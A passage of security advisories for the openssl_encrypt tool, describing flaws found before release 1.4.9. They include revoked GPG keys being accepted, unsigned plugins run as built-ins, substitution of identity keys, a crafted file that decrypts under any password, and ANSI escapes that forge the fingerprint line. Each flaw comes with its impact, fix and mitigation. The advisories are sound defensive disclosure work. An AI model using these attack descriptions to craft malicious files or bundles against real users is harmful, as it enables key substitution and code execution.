**Summary:** `gpg_runner.verify_detached` — the single primitive behind plugin signatures (ENFORCE by default), the per-package `PLUGIN.manifest`, and the source-integrity manifest — decided a signature was good from a `VALIDSIG`/`GOODSIG` status line alone, never inspecting the gpg exit status or the `REVKEYSIG`/`EXPKEYSIG`/`EXPSIG` status lines. GnuPG emits `VALIDSIG` *alongside* `REVKEYSIG` for a cryptographically valid signature made by a **revoked** key (and `EXPKEYSIG`/`EXPSIG` for an expired key or an expired signature). So an attacker holding a compromised-then-revoked signing key — or the project key after expiry — still got signatures accepted. The expected-fingerprint check also compared `VALIDSIG`'s signing fingerprint, which may be a subkey, rather than the primary-key fingerprint.

**Impact:** the whole point of revoking a compromised signing key — telling verifiers to stop trusting it — was defeated: a plugin, package manifest, or source-integrity manifest signed by a revoked or expired key still verified, so an unsigned-in-practice plugin from a burned key could be `exec()`'d in the host process. Exploitation requires the attacker to have obtained a once-trusted signing key that has since been revoked or has expired.

**Fixed in 1.4.9:** `verify_detached` now requires both `GOODSIG` and `VALIDSIG`, fails closed on any of `REVKEYSIG`/`EXPKEYSIG`/`EXPSIG`/`ERRSIG`/`BADSIG` and on a non-zero gpg exit status, and binds the expected-fingerprint comparison to `VALIDSIG`'s primary-key fingerprint rather than the possibly-subkey signing fingerprint. Regression-pinned by `test_gpg_verify_revoked_expired_232.py` (mock-based coverage of every status marker plus real-gpg integration tests).

**Mitigation for existing installs:** upgrade to 1.4.9; on earlier versions, treat revocation/expiry of a plugin- or manifest-signing key as not enforced by the tool.

**Disclosure:** tracked as gitlab#232 and GHSA-x38r-8wf3-q9hq (published with the 1.4.9 release). **Credit:** found by the 1.4.9 pre-release security scan (finding F36).

### ADVISORY 2026-23: Built-In Plugin Trust Shortcut Executed Unsigned Third-Party Plugins — Resolved

**Severity:** Medium · **CWE-347** (Improper Verification of Cryptographic Signature)
**Affected versions:** all releases with the plugin signature policy, up to and including **1.4.8**. **Fixed in 1.4.9** (both the 1.4.x and 1.5.x lines).

**Summary:** the plugin manager's built-in trust check (`_is_builtin_plugin`) used a denylist: it treated every file under the package `plugins/` directory as a trusted built-in — skipping signature verification, the AST scan and the TOCTOU hash pin — *except* the three `user`/`community`/`official` subdirectories. A plugin dropped directly in `plugins/` (top-level `plugins/*.py`) or under any new/unknown subdirectory was therefore trusted and `exec()`'d in the CLI process (which handles passwords, keys and plaintext) on the next `list-plugins`, `encrypt --hsm`, or decryption of a file whose metadata names an HSM plugin. `PLUGIN_DEVELOPMENT.md` directed third-party authors to place their plugin in exactly `openssl_encrypt/plugins/` (top-level), so following the documentation bypassed the ENFORCE-by-default signature policy.

**Impact:** arbitrary code execution from an unsigned plugin under the tool's own trust policy. Preconditions: an attacker (or a well-meaning developer following the old docs) places a `.py` file directly in the package `plugins/` directory or a non-standard subdirectory of it; the H8 owner-only-writable-location check still applies, so the attacker needs write access to that location. The plugin then runs in-process at the next plugin discovery.

**Fixed in 1.4.9:** built-in trust is now an **allowlist** — only the packages that ship with the tool (`examples`, `hsm`, `integrity`, `keyserver`, `pepper`, `steganography`, `telemetry`) are trusted to skip the gate. A file placed directly in the plugin root, in one of the advertised `user`/`community`/`official` drop directories, or in any other/unknown subdirectory now goes through the full signature + AST + hash-pin gate. `PLUGIN_DEVELOPMENT.md` now directs third-party plugins to `plugins/user`. A denylist failed open the moment a shipped-looking name that was not on it appeared; the allowlist fails closed. Regression-pinned by `test_plugin_builtin_trust_scope.py`.

**Mitigation for existing installs:** upgrade to 1.4.9; on earlier versions, ensure the package `plugins/` directory contains only the shipped built-in packages and place any third-party plugin under `plugins/user` where it is signature-checked.

**Disclosure:** tracked as gitlab#231 and GHSA-wxx9-p55f-wm34 (published with the 1.4.9 release). **Credit:** found by the 1.4.9 pre-release security scan (finding F10).

### ADVISORY 2026-22: Stored Identity Fingerprint Trusted Without Re-Deriving It From the Keys — Resolved

**Severity:** Medium · **CWE-345** (Insufficient Verification of Data Authenticity)
**Affected versions:** all releases with the identity subsystem, up to and including **1.4.8**. **Fixed in 1.4.9** (both the 1.4.x and 1.5.x lines).

**Summary:** `Identity.load` read the `fingerprint` field verbatim from an identity's `identity.json` and never re-derived it from the actual public-key `.pem` files, unlike the import path (`import_public`), which calls `check_fingerprint_consistency()` and fails closed. Under the supplied-store threat model (a shared contacts directory, an extracted archive, `--identity-store` / `OPENSSL_ENCRYPT_IDENTITY_STORE` pointing at attacker-controlled files), a store whose `identity.json` claimed a genuine out-of-band-verified fingerprint but whose `.pem` files held **attacker** keys was indistinguishable from a real pinned contact: `identity show` printed the good (claimed) fingerprint while `encrypt --for-identity` encapsulated to the attacker's ML-KEM key (F6); `decrypt_file_asymmetric` verified the ML-DSA signature against the substituted `signing_public.pem` and printed "Signature verified from: &lt;legitimate fingerprint&gt;", so a forged file passed the only authenticity check the format has (F7); and re-importing the real bundle raised no TOFU warning because `add_identity` compared the JSON-claimed fingerprint.

**Impact:** silent key substitution against the identity trust model — a supplied store can redirect encryption to an attacker's key and make forged files display a legitimate signer, with no warning. It does not affect a user's own locally generated identities (whose fingerprints are consistent by construction). Exploitation requires the victim to use an attacker-supplied identity store.

**Fixed in 1.4.9:** `Identity.load` now calls `check_fingerprint_consistency()` and fails closed when the stored fingerprint does not match the fingerprint recomputed from the public keys on disk, so a substituted store entry is rejected (and skipped/reported by `list_identities`) instead of being used under a forged fingerprint. The `add_identity` TOFU key-change check now compares the **recomputed** fingerprint on both sides, so a key substitution is detected from the actual keys (and a legacy-v1 vs v2 format difference for the same keys no longer causes a false positive). Regression-pinned by `test_identity_load_fingerprint_gate_230.py`.

**Note on scope:** this proves that a loaded identity's displayed/used fingerprint matches the keys it ships with; authenticity of the keys themselves still rests on out-of-band fingerprint verification and TOFU pinning (both of which this fix makes reliable). Binding the public-key bytes into the private-key at-rest AEAD's AAD (a separate defense-in-depth hardening against local write access to one's own identity directory) is tracked separately.

**Mitigation for existing installs:** upgrade to 1.4.9; on earlier versions, do not treat a fingerprint shown for an identity loaded from a supplied store as authenticated.

**Disclosure:** tracked as gitlab#230 and GHSA-q8p3-7h6h-ghfr (published with the 1.4.9 release). **Credit:** found by the 1.4.9 pre-release security scan (findings F6 and F7).

### ADVISORY 2026-21: Crafted File With an Unencrypted Embedded Post-Quantum Private Key Decrypts Under Any Password — Resolved

**Severity:** Medium · **CWE-287** (Improper Authentication)
**Affected versions:** all releases whose format supports embedded post-quantum private keys, up to and including **1.4.8**. **Fixed in 1.4.9** (both the 1.4.x and 1.5.x lines).

**Summary:** `decrypt_file` adopted a post-quantum private key embedded in a file's own metadata (`encryption.pqc_private_key`) verbatim whenever `pqc_key_encrypted` was false or absent — and it defaults to `False`. For `mayo-*`/`cross-*`/ML-KEM hybrid algorithms the bulk decryption key derives **only** from that embedded key, so the password-derived key is never consulted. An attacker could craft a self-contained file — a v5 header naming e.g. `mayo-1-hybrid`, an embedded raw private key, `aead_binding:false` and attacker-computed content hashes — that decrypts under **any** password the victim types, printing "integrity verified" and writing attacker-chosen plaintext. The mayo/cross variant needs no liboqs.

**Impact:** an authentication bypass for crafted files: the tool presents attacker-chosen plaintext as an authenticated, password-verified decryption. A user checking whether their password still opens a backup gets a false positive. It does not affect files produced by the tool itself — every store-private-key path marks the embedded key `key_encrypted=True`, so a legitimate file never carries an unencrypted embedded key. Exploitation requires the victim to decrypt an attacker-supplied file.

**Fixed in 1.4.9:** `decrypt_file` now default-denies any file whose metadata carries an embedded PQC private key that is not marked encrypted, enforced *before* any key derivation runs so no plaintext is produced and no password-independent key material is used. A trusted legacy file (should one exist) can still be read by explicitly passing `allow_unencrypted_pqc_key=True`. Regression-pinned by `test_pqc_unencrypted_key_deny_229.py`.

**Mitigation for existing installs:** upgrade to 1.4.9; do not rely on a successful decryption of an untrusted file as proof of its authenticity on earlier versions.

**Disclosure:** tracked as gitlab#229 and GHSA-qqfq-g2cv-j7v3 (published with the 1.4.9 release). **Credit:** found by the 1.4.9 pre-release security scan (finding F5).

### ADVISORY 2026-20: D-Bus `EncryptFile` Derived Keys Without Password Stretching — Resolved

**Severity:** High · **CWE-916** (Use of Password Hash With Insufficient Computational Effort)
**Affected versions:** all releases carrying the D-Bus service, up to and including **1.4.8**. **Fixed in 1.4.9.** **1.4.x only** — the D-Bus service was removed on the 1.5.x line.

**Summary:** the D-Bus `CryptoService.EncryptFile` handler hand-built its `hash_config` using flat key names (`sha512_iterations`, `argon2_time_cost`/`argon2_memory_cost`/`argon2_parallelism`, `enable_hkdf`, `balloon_iterations`) that the key-derivation core does not read — it consumes flat hash-round integers (`hash_config['sha256']`) and nested KDF dicts (`hash_config['argon2'] = {'enabled': True, ...}`). As a result no KDF and no hash rounds were ever enabled, and because the dict was non-empty it also defeated the encryptor's "no config → apply the STANDARD template (Argon2id + RandomX + SHA3 rounds)" default. Every file encrypted through the D-Bus service was therefore keyed by a single **unstretched SHA-256** of the password/salt/pepper seed instead of Argon2id (t=3, m=64 MiB, p=4). `quiet=True` suppressed the core's only unstretched-key warning, so the downgrade was silent.

**Impact:** offline password guessing against a file encrypted via the D-Bus service is roughly six to seven orders of magnitude cheaper than the tool's documented protection (~10^10 SHA-256/s on commodity GPUs versus ~10^3/s against Argon2id-64 MiB). Preconditions: the D-Bus service is installed and used to encrypt files (session or system bus), and an affected file reaches an attacker. It does not disclose keys directly or allow code execution; the file's own AEAD integrity is intact — only the work factor protecting the password is lost. Files encrypted through the normal CLI/GUI are unaffected.

**Fixed in 1.4.9:** the key-derivation configuration for the D-Bus path was moved to a dedicated, dbus-free module (`dbus_kdf_config.py`) that builds the config in the exact structure the core consumes — starting from the STANDARD template (always Argon2id-stretched) and mapping D-Bus options to the correct keys. The handler now **fails closed**: it refuses the encryption if the resulting config enables no hash rounds and no memory-hard/iterated KDF (Argon2/scrypt/balloon/RandomX), so no client option combination can produce an unstretched key. Because that mapping newly activates the client's KDF-cost options (previously dead), each cost override is also bounded at the D-Bus boundary: it may only **raise** cost above the STANDARD baseline, up to a ceiling above PARANOID — so a client can neither downgrade the key below STANDARD nor request an unbounded work factor as a denial-of-service (relevant on the root-owned system bus). Regression-pinned by `test_dbus_kdf_stretching_228.py`.

**Mitigation for existing installs:** re-encrypt any files produced through the 1.4.x D-Bus service after upgrading to 1.4.9 (or via the CLI, which was never affected); treat their passwords as exposed to accelerated offline guessing.

**Disclosure:** tracked as gitlab#228 and GHSA-v9r6-grch-fxw7 (published with the 1.4.9 release). **Credit:** found by the 1.4.9 pre-release security scan (finding F1).

### ADVISORY 2026-19: A Planted Template File Can Rank Itself First and Downgrade Key Derivation — Resolved

**Severity:** Medium · **CWE-345** (Insufficient Verification of Data Authenticity) / **CWE-732** (Incorrect Permission Assignment for Critical Resource) / **CWE-757** (Selection of Less-Secure Algorithm)
**Affected versions:** all releases with the template subsystem, up to and including **1.4.8** (1.4.x) / pre-**1.5.0** (1.5.x). **Fixed in 1.4.9 (1.4.x line) and 1.5.0 (1.5.x line).** Scope differs by line: the self-asserted-ranking issue (item 1) is **1.4.x only** — the template-management subsystem (`template list`/`compare`, `template_manager.py`) does not exist on 1.5.x — while the key-derivation downgrade and directory-permission issues (item 2) apply to **both lines** through the `encrypt --template` path.

**Summary:** the template subsystem trusted a template file for two things it should not have. (1) The metadata-bearing format took `security_score`/`security_level` **verbatim from the file** with no recomputation, and `list_templates()` sorts by that score — so a file claiming `"security_score": 99.0` ranked first, ahead of the genuinely strong built-in templates (1.4.x only). (2) A template's `hash_config` was applied to an encryption after only a structural check, with **no floor** on the KDF parameters, so a template could set e.g. `pbkdf2_iterations: 1` with Argon2 disabled — a key-derivation downgrade delivered through the `encrypt --template` interface (both lines). Compounding both, the template directory was created without an explicit mode (typically **0755**, group/other-writable), so another local user could plant a template into it (both lines).

**Impact:** a local user with write access to the template directory could plant a `.json`/`.yaml` template that (a) on 1.4.x advertises a top security rating and sorts to the front of `template list`, and (b) on either line applies weak key derivation to files encrypted with `--template` — making them far cheaper to brute-force. This is a local attack (write access to the template directory is required); it does not disclose keys or allow code execution, and after the fix the operation still proceeds. Rated Medium accordingly.

**Fixed in 1.4.9 / 1.5.0:** on 1.4.x, the self-asserted rating is **recomputed from the actual config on load** (`_recompute_security_rating`), so a file's claimed score/level is always discarded and a config that cannot be analysed scores 0 (ranks last); built-in templates are trusted and analyzer-scored as before. On **both lines**, applying a file template now **warns loudly** when its KDF parameters fall below a floor (no memory-hard KDF — Argon2 ≥ 64 MiB, scrypt N ≥ 16384, or Balloon space_cost ≥ 65536 — and pbkdf2 below the 600 000 OWASP minimum), and the template directory has its group/other **write** bits stripped best-effort on both the template-management path (1.4.x) and the `encrypt --template` read path (both lines; read preserved for multi-user installs), closing the plant-a-template vector.

**Caveat on the KDF warning:** the weak-template warning is **advisory only** — the encryption still proceeds (this is the chosen behaviour, so a deliberately fast/test template is not blocked), and it is written to **stderr**, so in scripted or stderr-redirected use it may go unseen. The load-bearing protection against a *planted* template is therefore the directory-permission tightening; the warning is a second line of defence for a template the owner themselves configured weakly.

**Mitigation for existing installs:** ensure the template directory (`<package>/templates`) is not group/other-writable (`chmod go-w`), and review any non-built-in template files you did not create — a file declaring a high `security_score` with weak `hash_config` (low `pbkdf2_iterations`, no Argon2/scrypt) is the pattern to remove.

**Credit:** found during the security review of the gitlab#167 fix (gitlab#169).

### ADVISORY 2026-18: `identity create --hsm onlykey` Silently Binds the Identity to the YubiKey — Resolved

**Severity:** Medium · **CWE-440** (Expected Behavior Violation) / **CWE-636** (Not Failing Securely)
**Affected versions:** all releases with OnlyKey identity protection, up to and including **1.4.8**. **Fixed in 1.4.9 (1.4.x line) and 1.5.0 (1.5.x line).**

**Summary:** `identity create --hsm onlykey` computed the correct HSM type
(`onlykey`) and used it only for a pre-flight availability check;
`Identity.generate()` had no `hsm_type` parameter and constructed the key
protection service with the `"yubikey"` default. Worse, the identity's recorded
`hsm_config.hsm_type` was never consulted for plugin selection anywhere — both
the private-key encryption (`_encrypt_private_key`) and decryption
(`_decrypt_private_key`) paths also built the service with the bare `"yubikey"`
default. So an OnlyKey selection was silently dropped: plugin selection was
`"yubikey"` at every real key-derivation site.

**Impact:** the identity is bound to a **different hardware trust anchor than
the user selected**. With only an OnlyKey present, creation fails with a
misleading `no Yubikey available` error despite the pre-flight passing. With
both a YubiKey and an OnlyKey present, creation succeeds and the identity is
silently **YubiKey-bound** — recorded, encrypted and decrypted with the YubiKey
plugin — and can never be opened with the OnlyKey the user chose. This is a
wrong-device-binding correctness bug with an availability/data-loss angle: a
user who believes the OnlyKey gates the identity, and later retires or loses the
YubiKey, is locked out. It is not remotely exploitable — there is no adversary,
no key disclosure, and the identity remains protected by a real password + HSM —
so no GHSA/CVE is assigned; it is recorded here for the wrong-trust-anchor and
lockout risk.

**Fixed in 1.4.9 / 1.5.0:** `Identity.generate()` takes an `hsm_type` parameter
(default `"yubikey"` for backward compatibility) and threads it into the
protection service; `identity create` passes the selected device through; and
`_encrypt_private_key` / `_decrypt_private_key` build the service from the
identity's recorded `hsm_config.hsm_type`, so an OnlyKey identity uses the
OnlyKey plugin end to end. The device names in the HSM error messages now
reflect the configured device instead of hardcoding "Yubikey". Existing YubiKey
identities are unaffected: the `"yubikey"` default and the legacy
`hsm_type`-absent fallback both keep selecting the YubiKey plugin.

**Mitigation for existing identities:** if you ran `identity create --hsm
onlykey` (or `onlykey-only`) on an affected release with both a YubiKey and an
OnlyKey attached, the resulting identity is gated by the YubiKey, not the
OnlyKey. Confirm which device unlocks it, and re-create the identity on a fixed
release to bind it to the OnlyKey.

**Credit:** found tracing gitlab#161 during desktop-GUI work; confirmed by a
crypto-lens review (gitlab#218 finding 3).

### ADVISORY 2026-17: File Password Printed in Cleartext by the `--debug` argv Dump for Bundled and Abbreviated Option Spellings — Resolved

**Severity:** Medium · **CWE-532** (Insertion of Sensitive Information into Log File) / **CWE-215** (Insertion of Sensitive Information Into Debugging Code)
**Affected versions:** all releases up to and including **1.4.8**. **Fixed in 1.4.9 (1.4.x line) and 1.5.0 (1.5.x line).**

**Summary:** under `--debug`, the tool prints its own argv, routing
secret-valued options through the `debug_secret()` redaction chokepoint first.
`sanitize_argv_for_debug` selected what to redact by **exact string
membership** in `SECRET_VALUE_CLI_OPTIONS`, plus two special cases:
`--option=value`, and a rule matching a token that literally starts with `-p`.
argparse accepts two further spellings that neither covers.

The `encrypt` subparser declares `-a/--armor`, `-f/--overwrite` and
`-s/--shred` as `store_true` on the same parser as the value-taking
`-p/--password`, so argparse resolves `-apHunter2` to `-a` plus
`-p=Hunter2` — a token that does not start with `-p`. Separately, no parser
sets `allow_abbrev=False`, so an abbreviated long option such as
`--manifest-p` binds `--manifest-password` while matching no set member.

**Impact:** the file password is written to stderr in cleartext, under the
plain `--debug` mode whose own banner states that secrets are redacted (the
loud cleartext warning is reserved for `--debug --unsafe-show-secrets`).
stderr is not a private channel: it reaches terminal scrollback, is merged by
`2>&1`, lands in CI job logs, and the desktop GUI keeps a persistent debug
log. The value bypasses the `debug_secret()` chokepoint entirely.

**Reachability in a released version — measured, not assumed:** the v1.4.8
sanitizer was lifted verbatim from the `v1.4.8` tag and executed:

```
LEAK  ['secret.txt', '-apHunter2']              <- crypt --debug encrypt -i secret.txt -apHunter2
LEAK  ['-ap', 'Hunter2']                        <- crypt --debug encrypt -i secret.txt -ap Hunter2
safe  ['secret.txt', '-p<redacted: 7 bytes>']   <- the only spelling covered
```

The `--manifest-p` variant additionally requires `create-usb`, which is
unreachable before 1.4.9 (gitlab#179), so that one affects no release.

**Fixed in:** 1.4.9 / 1.5.0. Each token is now resolved the way argparse
resolves it before the redaction decision: long options by unambiguous
prefix, short-option bundles by walking the letters until a secret-valued
short option is reached, redacting either the attached remainder or the
following token. Ambiguity fails **closed** — an unresolvable option that
could name a secret is redacted, the opposite of the command scan's default,
because printing a password is worse than redacting a filename.

**Mitigation:** rotate any password used with `--debug` together with a
bundled (`-ap…`, `-afsp…`) or abbreviated (`--passw`, `--pass`) spelling, and
review any retained terminal logs, CI output, or GUI debug logs for it. The
documented `-p PASSWORD` and `-pPASSWORD` forms were always redacted
correctly and are unaffected.

**Disclosure:** found during the follow-up security review of gitlab#177
(argv-layer scanning), which examined the surrounding argv handling after the
initial fix. Tracked as gitlab#209 / GHSA-jgvm-7jxv-cgcc (held until release).

### ADVISORY 2026-16: Post-Quantum Keyfile Written Without Encryption by a Duplicate Code Path — Resolved

**Severity:** Medium · **CWE-312** (Cleartext Storage of Sensitive Information) / **CWE-1041** (Redundant Code)
**Affected versions:** all releases up to and including **1.4.8**. **Fixed in 1.4.9 (1.4.x line) and 1.5.0 (1.5.x line).**

**Summary:** `crypt_cli.py` carried two independent implementations of the
`--pqc-keyfile` save/load logic. Commit `320305ee` added password-wrapping to
the copy that existed at the time; `c41a3a1cb` ("fix for claude code massive
deletions") reconstructed the file and reintroduced the pre-fix plaintext
pattern as a *second* copy; and `aef4ab42` (gitlab#131 / F16,
GHSA-fmjx-p826-6fvr) later upgraded the wrapping to Argon2id, its own commit
message describing "the one write site". The duplicate wrote `private_key` as
bare base64 with no `key_encrypted` marker, and its loader read `private_key`
unconditionally, so a properly wrapped keyfile would have had its AES-GCM
ciphertext base64-decoded and used as if it were the key.

**Impact:** a `.pqc` keyfile written by the duplicate path holds the long-lived
post-quantum private key with **no wrapping at all** — anyone who obtains the
file has the key outright, with no password to brute-force first, which is the
weakness GHSA-fmjx-p826-6fvr was raised to remove. The keyfile was also created
through a bare `open(path, "w")`, so its mode came from the umask (typically
0644) rather than 0600.

**Reachability in a released version — measured, not assumed:** `--pqc-gen-key`
is not accepted by the documented `encrypt` subcommand: `openssl-encrypt
encrypt --pqc-gen-key …` exits 2 with `unrecognized arguments`. But `main()`
selects the subparser route only when the first non-flag token is a subcommand
name, so putting an option *before* the subcommand — `openssl-encrypt -i
file.txt encrypt --overwrite --pqc-gen-key --pqc-keyfile k.pqc --algorithm
ml-kem-768-hybrid` — makes `file.txt` the apparent command, falls through to the
monolithic parser, and **does** run the save path. Verified against the
pre-fix code: exit 0, keyfile written.

What that run produces is a keyfile that is ultimately **wrapped**, at mode
**0644**. Both copies execute in the same invocation: the cleartext writer runs
first inside the `--overwrite` branch, and the Argon2id writer then runs and
overwrites the same path. So the unwrapped private key is written to disk and
replaced moments later, rather than persisting — the exposure is to anyone able
to read the file inside that window, or to recover the freed blocks afterwards,
not to anyone who finds the keyfile later. The 0644 mode, by contrast,
persisted.

A second consequence of the two writers running in sequence: the key saved to
the keyfile is not the key used for the encryption, so a keyfile produced this
way does not correspond to the file produced alongside it. No data is lost —
the file password recovers the plaintext — but the keyfile is useless.

**Fixed in 1.4.9 / 1.5.0:** the duplicate is deleted. `--pqc-gen-key` is now
declared on the real `encrypt` subparser, so the wrapped save path is reachable
as documented; a `--pqc-keyfile` naming a non-existent path without it is
refused with an instruction rather than silently ignored; and the keyfile is
written through `create_secure_file(..., exclusive=True)`, so it is created
0600, a pre-planted symlink or FIFO at that path is refused rather than
followed, and an existing file is never silently clobbered.

**Mitigation for existing keyfiles:** inspect any `.pqc` keyfile you hold. If
it lacks a `key_encrypted` field, the private key inside it is stored in the
clear — treat it as compromised, regenerate the key pair, and re-encrypt
anything protected by it.

**Credit:** found during the source review of gitlab#153 and confirmed by
tracing CLI reachability.

### ADVISORY 2026-15: Contact Stored Under an Own Identity's Name Silently Substitutes Its Keys on Deletion — Resolved

**Severity:** High · **CWE-706** (Use of Incorrectly-Resolved Name or Reference) / **CWE-345**
**Affected versions:** all releases up to and including **1.4.8**. **Fixed in 1.4.9 (1.4.x line) and 1.5.0 (1.5.x line).**
**Advisory:** [GHSA-8gmx-w9m8-vx7q](https://github.com/jahlives/openssl_encrypt/security/advisories/GHSA-8gmx-w9m8-vx7q)

**Summary:** `IdentityStore.get_by_name` resolves own identities before
contacts, but `add_identity` chose its destination directory purely from
whether the identity was an own one. Importing a contact whose name matched an
existing own identity created a **shadowed** contact entry — invisible while
the own identity existed, since every lookup resolved the own identity first.
`delete_identity` removed only the first location it found, so deleting the own
identity left the shadow in place and `get_by_name` then resolved to the
contact's keys under a name the user trusts. `identity list` showed both
entries under one name with no disambiguation.

**Impact:** recipient resolution goes through `get_by_name`, so this is a live
key substitution: after the user deletes their own identity — an ordinary
action, e.g. following a key rotation — files encrypted to that name are
encrypted to the attacker's key. The TOFU key-change dialogue fires on the
import, but it is a gate about a *changed key*: it is designed to be passable
with `--allow-key-change`, and it does not fire at all when the fingerprints
match. The desktop GUI's contact-import alias field made this materially easier
to reach, turning "guess a name and get the user past a warning about a bundle
claiming to be their own identity" into "the user types their own identity's
name into a free-text alias box".

**Fixed in 1.4.9 / 1.5.0:** `add_identity` refuses a name that already exists
as the other kind, in both directions and independently of the key-change gate
— a name resolves to one key, so the collision fails closed on its own.
`delete_identity` removes both locations, so a store that already contains a
shadow cannot promote it. `IdentityStore.find_shadowed_names()` reports
colliding names, and `identity list` surfaces them in both its human output and
its `--json` document.

**Mitigation:** upgrade. On an affected version, run `identity list` and look
for a name appearing as both an own identity and a contact; verify any such
contact's fingerprint out of band before deleting anything.

**Remediation note:** `identity delete <name>` removes **both** entries by
default, which is correct for a collision — leaving a resolvable shadow is the
substitution — but destroys the own identity's private keys. Use
`--kind own|contact` to remove one side, and back up the identity store first.

**Disclosure:** internal security review of the contact-import path
(2026-07-26, gitlab#173). **Credit:** internal security review.

### ADVISORY 2026-14: Imported Identity Email Printed Unsanitized Lets ANSI Escapes Forge the Fingerprint Verification Line — Resolved

**Severity:** Medium · **CWE-150** (Improper Neutralization of Escape, Meta, or Control Sequences) / **CWE-20**
**Affected versions:** all releases up to and including **1.4.8**. **Fixed in 1.4.9 (1.4.x line) and 1.5.0 (1.5.x line).**
**Advisory:** [GHSA-qjr2-x6mr-8xgf](https://github.com/jahlives/openssl_encrypt/security/advisories/GHSA-qjr2-x6mr-8xgf)

**Summary:** `Identity.import_public` validated the identity `name` but accepted
the `email` field of an imported identity document completely raw, and the CLI
printed it to the terminal unsanitized (`identity import` success output,
`identity list`, `identity show`) — directly above the `Fingerprint:` line. A
JSON string may carry `\u001b` escape sequences (the JSON security validator
rejects only *literal* control characters, whose escaped source text is
printable), so a crafted bundle's email could carry ANSI cursor-movement
sequences that overwrite the genuine fingerprint line with one the victim
trusts. The same class existed on the **keyserver TOFU trust prompt** — which
renders a *remotely fetched* bundle's `name`/`email`/`created_at` raw around
the fingerprint it tells the user to verify out of band, where the bundle's
self-signature is no defence (it verifies against the signing key shipped *in*
the bundle) — on stored identity files read back from disk (an
`--identity-store` directory feeds `list`/`show` and the TOFU key-change
warning with no import-time check), on a signature sidecar
(`signer_fingerprint` printed before any cryptographic check; `algorithm`
echoed by the unsupported-algorithm error pre-verification; and the
display-only `component` name — deliberately excluded from the signed
payload, so any tamperer can rewrite it on a *valid* signature — printed
inside the GOOD-signature verdict block), on a keyserver's raw HTTP error
body reaching the terminal through exception messages, and on error paths
where a rejected identity name or `--alias` was interpolated verbatim into
the `IdentityError` message the CLI echoes.

**Impact:** out-of-band fingerprint comparison is the only authenticity
mechanism the identity design has. An attacker who can deliver an identity
bundle to the victim — the normal contact-exchange flow (`--file`, the GUI's
paste field) or a keyserver response — can forge the fingerprint readout used
for that comparison, enabling exactly the key substitution the TOFU pinning
ceremony exists to surface.

**Fixed in 1.4.9 / 1.5.0:** identity metadata is validated at every boundary —
`import_public`, `Identity.generate` (`identity create --email` is the
producer side: the value is exported verbatim and uploaded), `Identity.load`,
and `PublicKeyBundle` validate `email` (string, ≤ 320 chars, no control
characters), `fingerprint` (colon-separated lowercase hex, the only shape the
tool has ever written), and `created_at` (≤ 64 chars, no controls);
`parse_signature` format-validates `signer_fingerprint`, `algorithm`, and
every `component` name; keyserver HTTP error bodies are truncated and
sanitized; and `identity.json` is read bounded, explicitly UTF-8, and through
the JSON security validator. A display sanitizer
escapes C0 controls, DEL, the C1 range (one-byte CSI introducers included),
backslash (output unambiguity), and the bidi/format controls (honoured by
VTE/Kitty, able to visually reverse an email within its line) at every
terminal display of these fields: the identity CLI, the keyserver trust
prompt and `keyserver search`, the TOFU key-change warning, the
verified-signature sender line, and every identity CLI error path. Escaping
rather than stripping keeps the evidence visible.

**Mitigation:** upgrade. Contacts and cached keyserver bundles imported by
earlier versions with crafted fields are neutralized at display time by the
same sanitizer; re-verify the fingerprint of any contact imported or trusted
via the keyserver prompt on an affected version if the displayed readout was
relied upon.

**Disclosure:** internal security review of the contact-import path
(2026-07-26, gitlab#172). **Credit:** internal security review.

### ADVISORY 2026-13: Plugin-Signing Trust-Anchor Enrollment Accepts a Partial/Suffix Fingerprint Match — Resolved

**Severity:** Low · **CWE-297** (Improper Validation of Certificate/Key with Host Mismatch, adapted) / **CWE-347**
**Affected versions:** all releases up to and including **1.4.8**. **Fixed in 1.4.9 (1.4.x line) and 1.5.0 (1.5.x line).**
**Advisory:** [GHSA-xg52-638v-jc5m](https://github.com/jahlives/openssl_encrypt/security/advisories/GHSA-xg52-638v-jc5m)

**Summary:** `enroll_trust_key` bound a plugin-signing trust anchor to the
operator-confirmed fingerprint using suffix-tolerant matching
(`got.endswith(exp) or exp.endswith(got)`). Confirming a short GPG key id (e.g.
an 8-hex / 32-bit short id, a known-forgeable identifier) let a key whose full
fingerprint merely ends with those characters be enrolled as a trusted anchor.

**Impact:** an attacker who can influence which public-key file is enrolled, and
whose crafted key's fingerprint collides on the short id the operator confirms,
gets their key enrolled as a plugin-signing trust anchor. That anchor then
vouches for arbitrary attacker-signed plugins, which pass even the ENFORCE
signature policy — a path to plugin code execution. Narrow: it requires the
operator to confirm a short id rather than the full fingerprint.

**Fixed in 1.4.9 / 1.5.0:** enrollment now requires the confirmed value to equal
the **full primary-key fingerprint exactly** (case-insensitive,
whitespace-stripped); short or partial confirmations are rejected.

**Mitigation:** upgrade, and re-verify any trust anchors enrolled on an earlier
version by confirming their full 40-character fingerprint out of band.

**Disclosure:** internal multi-agent security scan (2026-07-24, gitlab#136).
**Credit:** internal security review.

### ADVISORY 2026-12: Plugin Sandbox Authorizes Sibling Directories via a Bare Path Prefix — Resolved

**Severity:** Low · **CWE-706** (Use of Incorrectly-Resolved Name or Reference) / **CWE-282**
**Affected versions:** all releases up to and including **1.4.8**. **Fixed in 1.4.9 (1.4.x line) and 1.5.0 (1.5.x line).**
**Advisory:** [GHSA-vr4h-5xqv-xxxf](https://github.com/jahlives/openssl_encrypt/security/advisories/GHSA-vr4h-5xqv-xxxf)

**Summary:** `PluginSandbox._is_safe_path` authorized a file path with a bare
string-prefix match against the allowed directories (temp dir, stdlib, the
plugin's config dir, and the plugin's code dir). A path was wrongly authorized
whenever it shared the textual prefix of an allowed directory, e.g.
`.../plugins/foobar` matched the directory allowed for plugin `foo`.

**Impact:** a sandboxed plugin `foo` (without `READ_FILES`) could read and write
another plugin's private config/data directory under
`~/.openssl_encrypt/plugins/` and read another plugin's code directory — a
cross-plugin authorization break (IDOR-style) within the same user, defeating the
per-plugin isolation the sandbox intends. Bounded: it does not reach arbitrary
filesystem paths and stays within the user account.

**Fixed in 1.4.9 / 1.5.0:** each allowed directory is matched as itself or with a
trailing path separator (`dir` or `dir + os.sep`), so a prefix-sharing sibling is
no longer authorized. The pre-existing realpath/normpath anti-traversal check is
unchanged.

**Mitigation:** upgrade. No file-format or configuration change is required.

**Disclosure:** internal multi-agent security scan (2026-07-24, gitlab#133).
**Credit:** internal security review.

### ADVISORY 2026-11: Keyserver Bearer Token Echoed in Cleartext in the `--debug` argv Dump — Resolved

**Severity:** Low · **CWE-532** (Insertion of Sensitive Information into Log File)
**Affected versions:** all releases up to and including **1.4.8**. **Fixed in 1.4.9 (1.4.x line) and 1.5.0 (1.5.x line).**
